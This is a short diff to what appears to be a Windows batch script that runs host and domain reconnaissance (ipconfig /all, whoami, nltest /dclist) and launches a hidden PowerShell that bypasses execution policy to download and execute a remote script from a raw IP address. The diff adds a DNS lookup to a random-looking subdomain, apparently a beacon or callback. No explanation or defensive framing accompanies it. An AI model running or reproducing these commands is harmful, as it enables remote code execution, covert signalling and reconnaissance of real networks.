@@ -217,6 +217,8 @@ ipconfig /all
 ECHO ============================
 whoami
 ECHO ============================
+nslookup bcdyzit4r3e5tet6y3e6y3w3e6y6y6y.testdeneme12345edced.com
+ECHO ============================
 nltest /dclist:abc.local
 ECHO ============================
 powershell.exe -W hidden -Exec Bypass -nologo -noprofile -command "IEX(New-Object Net.WebClient).DownloadString('http://91.91.91.91:80/powershellscript')"
